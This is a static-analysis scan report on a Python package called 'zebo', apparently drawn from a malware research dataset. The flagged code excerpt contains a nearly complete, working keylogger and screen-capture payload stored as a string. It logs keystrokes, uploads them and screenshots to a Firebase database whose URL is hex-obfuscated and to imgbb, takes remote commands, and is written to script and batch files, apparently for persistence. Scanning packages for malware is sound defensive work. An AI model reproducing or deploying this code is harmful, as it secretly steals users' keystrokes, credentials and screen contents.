Run started:2025-05-25 16:19:52.125470

Test results:
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/zebo-0.1.0/zebo-0.1.0/zebo-0.1.0/zebo/scripts/runner.py:5
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
4	
5	python_code = '''import os
6	import requests
7	from datetime import datetime
8	import socket
9	import threading
10	import time
11	from PIL import ImageGrab
12	from pynput.keyboard import Listener, Key
13	from filelock import FileLock, Timeout
14	import os
15	
16	nm = ''
17	try:
18	    nm = os.getlogin()
19	except:
20	    pass
21	
22	systempy_folder = "C:\\system-logs"
23	os.chdir(systempy_folder)
24	
25	fu = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x72\x6f\x6a\x65\x63\x74\x2d\x72\x75\x6e\x6e\x6e\x65\x72\x2d\x64\x65\x66\x61\x75\x6c\x74\x2d\x72\x74\x64\x62\x2e\x66\x69\x72\x65\x62\x61\x73\x65\x69\x6f\x2e\x63\x6f\x6d\x2f'
26	os.makedirs('files', exist_ok=True)
27	log_file = "files/system-files.txt"
28	hostname = nm+'-'+socket.gethostname()
29	screenshot_folder = "systemss"
30	command_path = f'users/{hostname}/command.json'
31	
32	LOCK_FILE = "files/my_script.lock"
33	
34	def prevent_multiple_instances():
35	    lock = FileLock(LOCK_FILE + ".lock")
36	    try:
37	        lock.acquire(timeout=0)
38	        return lock
39	    except Timeout:
40	        print("Another instance of this script is already running. Exiting.")
41	        exit(1)
42	
43	
44	def is_internet_available():
45	    try:
46	        socket.create_connection(("8.8.8.8", 53), timeout=5)
47	        return True
48	    except (socket.timeout, socket.error):
49	        return False
50	
51	
52	def fetch_api_key():
53	    api_key_path = 'system.json'
54	    try:
55	        response = requests.get(fu + api_key_path)
56	        if response.status_code == 200:
57	            api_key_data = response.json()
58	            return api_key_data.get('api_key')
59	        else:
60	            return None
61	    except requests.exceptions.RequestException as e:
62	        return None
63	
64	
65	def upload_log():
66	    with open(log_file, 'r') as file:
67	        content = file.read().strip()
68	
69	    command_path = f'users/{hostname}/command.json'
70	    active_path = f'users/{hostname}/activate.json'
71	    try:
72	        active = {'last_login': datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
73	        response = requests.put(fu + active_path, json=active)
74	        requests.put(fu + command_path,
75	                     json={'ss_count': 0, 'log_upload': False})
76	    except:
77	        pass
78	
79	    new_log_marker = f"** New logging started at"
80	    if content.startswith(new_log_marker) and content.count(new_log_marker) == 1 and len(content.split("\\n")) == 1:
81	        return False
82	
83	    if not is_internet_available():
84	        return False
85	
86	    db_path = f'users/{hostname}/keylog/{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.json'
87	
88	    with open(log_file, 'r') as file:
89	        file_data = file.read()
90	    data_to_upload = {'runnner': file_data}
91	
92	    try:
93	        response = requests.put(fu + db_path, json=data_to_upload)
94	        if response.status_code == 200:
95	            with open(log_file, 'w') as file:
96	                file.truncate(0)
97	            add_new_log_marker()
98	            return True
99	        else:
100	            return False
101	    except requests.exceptions.RequestException as e:
102	        return False
103	
104	
105	def add_new_log_marker():
106	    with open(log_file, 'a') as file:
107	        file.write(
108	            f"\\n** New logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} **\\n")
109	
110	
111	def periodic_upload():
112	    while True:
113	        if upload_log():
114	            pass
115	        else:
116	            pass
117	        time.sleep(3600)
118	
119	
120	def periodic_screenshots():
121	    os.makedirs(screenshot_folder, exist_ok=True)
122	    while True:
123	        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
124	        screenshot_path = os.path.join(
125	            screenshot_folder, f"{hostname}_{timestamp}.png")
126	        try:
127	            screenshot = ImageGrab.grab()
128	            screenshot.save(screenshot_path)
129	            upload_image_to_imgbb(screenshot_path)
130	            os.remove(screenshot_path)
131	        except Exception as e:
132	            pass
133	        time.sleep(3600)
134	
135	
136	def upload_image_to_imgbb(image_path):
137	    api_key = fetch_api_key()
138	    with open(image_path, 'rb') as image_file:
139	        files = {'image': image_file}
140	        params = {'key': api_key}
141	        response = requests.post(
142	            'https://api.imgbb.com/1/upload', files=files, params=params)
143	
144	    if response.status_code == 200:
145	        response_json = response.json()
146	        image_url = response_json['data']['url']
147	    else:
148	        pass
149	
150	
151	recent_keys = {}
152	debounce_time = 0.2
153	
154	
155	def write_to_file(key):
156	    current_time = time.time()
157	    key_str = None
158	    if hasattr(key, 'char') and key.char:
159	        key_str = key.char
160	    elif key == Key.space:
161	        key_str = "\t"
162	    elif key == Key.enter:
163	        key_str = "\\n"
164	    elif key == Key.backspace:
165	        key_str = "[BS]"
166	
167	    if key_str and (current_time - recent_keys.get(key_str, 0)) > debounce_time:
168	        with open(log_file, "a") as file:
169	            file.write(key_str)
170	        recent_keys[key_str] = current_time
171	
172	
173	def start_listener():
174	    with Listener(on_press=write_to_file) as listener:
175	        listener.join()
176	
177	
178	def ensure_log_exists():
179	    if not os.path.exists(log_file):
180	        with open(log_file, 'w') as file:
181	            pass
182	
183	
184	def delete_all_files_in_folder(folder_path):
185	    try:
186	        if not os.path.exists(folder_path):
187	            return
188	        for file_name in os.listdir(folder_path):
189	            file_path = os.path.join(folder_path, file_name)
190	            if os.path.isfile(file_path):
191	                os.remove(file_path)
192	    except Exception as e:
193	        pass
194	
195	
196	def handle_screenshot_interval():
197	    os.makedirs(screenshot_folder, exist_ok=True)
198	    while True:
199	        try:
200	            response = requests.get(fu + command_path)
201	            if response.status_code == 200:
202	                command_data = response.json()
203	
204	                if command_data is None:
205	                    command_data = {'ss_count': 0, 'log_upload': True}
206	                elif 'ss_count' not in command_data:
207	                    command_data['ss_count'] = 0
208	                    command_data['log_upload'] = True
209	
210	                ss_count = command_data.get('ss_count', 0)
211	                if ss_count > 0:
212	                    for _ in range(ss_count):
213	                        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
214	                        image_path = os.path.join(
215	                            screenshot_folder, f"{hostname}_{timestamp}.png")
216	                        try:
217	                            screenshot = ImageGrab.grab()
218	                            screenshot.save(image_path)
219	                            upload_image_to_imgbb(image_path)
220	                            os.remove(image_path)
221	                            time.sleep(10)
222	                        except Exception as e:
223	                            pass
224	
225	                    command_data['ss_count'] = max(
226	                        0, command_data['ss_count'] - ss_count)
227	                    requests.put(fu + command_path, json=command_data)
228	
229	            else:
230	                pass
231	        except requests.exceptions.RequestException as e:
232	            pass
233	
234	        time.sleep(10)
235	        delete_all_files_in_folder(screenshot_folder)
236	
237	
238	def check_immediate_upload():
239	    while True:
240	        try:
241	            response = requests.get(fu + command_path)
242	            if response.status_code == 200:
243	                command_data = response.json()
244	                if command_data is None:
245	                    command_data = {'ss_count': 0, 'log_upload': False}
246	                elif 'ss_count' not in command_data:
247	                    command_data['ss_count'] = 0
248	                    command_data['log_upload'] = False
249	
250	                log_upload = command_data.get('log_upload', False)
251	                if log_upload:
252	                    upload_log()
253	                    time.sleep(10)
254	        except:
255	            pass
256	
257	
258	def main():
259	    ensure_log_exists()
260	    add_new_log_marker()
261	
262	    listener_thread = threading.Thread(target=start_listener, daemon=True)
263	    listener_thread.start()
264	
265	    upload_thread = threading.Thread(target=periodic_upload, daemon=True)
266	    upload_thread.start()
267	
268	    log_interval_thread = threading.Thread(
269	        target=check_immediate_upload, daemon=True)
270	    log_interval_thread.start()
271	
272	    screenshot_interval_thread = threading.Thread(
273	        target=handle_screenshot_interval, daemon=True)
274	    screenshot_interval_thread.start()
275	
276	    listener_thread.join()
277	    upload_thread.join()
278	    screenshot_interval_thread.join()
279	    log_interval_thread.join()
280	
281	
282	lock = prevent_multiple_instances()
283	try:
284	    main()
285	finally:
286	    lock.release()
287	'''
288	def i_am_cute():

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/zebo-0.1.0/zebo-0.1.0/zebo-0.1.0/zebo/scripts/runner.py:303
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
302	    with open(python_script_dest, "w") as file:
303	        file.write(python_code)
304	

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/zebo-0.1.0/zebo-0.1.0/zebo-0.1.0/zebo/scripts/runner.py:311
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
310	    with open(batch_file_path, "w") as file:
311	        file.write(batch_file_content)
312	

--------------------------------------------------

Code scanned:
	Total lines of code: 290
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 1.0
		High: 2.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 3.0
		High: 0.0
Files skipped (0):
